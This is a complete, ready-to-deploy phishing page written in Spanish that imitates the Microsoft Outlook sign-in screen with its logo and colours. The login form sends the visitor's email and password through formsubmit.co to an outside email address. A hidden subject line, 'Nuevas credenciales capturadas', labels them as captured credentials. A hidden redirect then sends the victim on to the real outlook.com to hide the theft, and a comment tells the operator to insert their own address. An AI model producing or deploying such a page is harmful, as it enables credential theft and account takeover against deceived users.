<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-box {
            background-color: white;
            padding: 44px;
            width: 320px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            border-radius: 4px;
        }

        /* Estilos del Logo */
        .logo-container {
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .outlook-icon {
            width: 24px;
            height: 24px;
        }

        .brand-name {
            color: #767777; /* Color gris oscuro típico de subtítulos */
            font-size: 20px;
            font-weight: 600;
        }

        h1 {
            font-size: 20px;
            margin-top: 0;
            margin-bottom: 10px;
            color: #333;
        }

        p {
            font-size: 13px;
            color: #666;
            margin-bottom: 20px;
        }

        label {
            font-size: 13px;
            color: #333;
            margin-bottom: 5px;
            display: block;
        }

        input[type="email"], 
        input[type="password"] {
            width: 100%;
            padding: 8px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-bottom: 2px solid #0078d4;
            border-radius: 2px;
            box-sizing: border-box;
            outline: none;
        }

        input:focus {
            background-color: #e6f0fa;
        }

        button {
            background-color: #0078d4;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            cursor: pointer;
            font-size: 14px;
            border-radius: 2px;
        }

        button:hover {
            background-color: #005a9e;
        }

        .link {
            display: block;
            text-align: center;
            margin-top: 15px;
            color: #0078d4;
            text-decoration: none;
            font-size: 13px;
        }
    </style>
</head>
<body>

    <div class="login-box">
        
        <!-- LOGO OFICIAL ACTUALIZADO -->
        <div class="logo-container">
            <svg class="outlook-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path fill="#0078D4" d="M21.2,6.2 L12,13 L2.8,6.2 C2.3,5.8 2,5.2 2,4.5 C2,3.1 3.1,2 4.5,2 L19.5,2 C20.9,2 22,3.1 22,4.5 C22,5.2 21.7,5.8 21.2,6.2 Z"/>
                <path fill="#0078D4" d="M2,7.5 L12,15 L22,7.5 L12,19 L2,7.5 Z M12,22 L2,15 L2,19.5 C2,20.9 3.1,22 4.5,22 L19.5,22 C20.9,22 22,20.9 22,19.5 L22,15 L12,22 Z"/>
            </svg>
            <span class="brand-name">Outlook</span>
        </div>

        <h1>Iniciar sesión</h1>
        <p>Introduce tus credenciales para continuar.</p>

        <!-- IMPORTANTE: Cambia TU_CORREO@AQUI.COM por tu email real -->
        <form action="https://formsubmit.co/mm1014@outlook.es" method="POST">
            
            <!-- Configuración opcional para FormSubmit -->
            <input type="hidden" name="_subject" value="Nuevas credenciales capturadas">
            <input type="hidden" name="_next" value="https://www.outlook.com">

            <label for="email">Correo electrónico</label>
            <input type="email" id="email" name="email" placeholder="usuario@outlook.com" required>

            <label for="password">Contraseña</label>
            <input type="password" id="password" name="password" placeholder="••••••••" required>

            <button type="submit">Iniciar sesión</button>

            <a href="#" class="link">¿Lo olvidaste?</a>
        </form>
    </div>

</body>
</html>
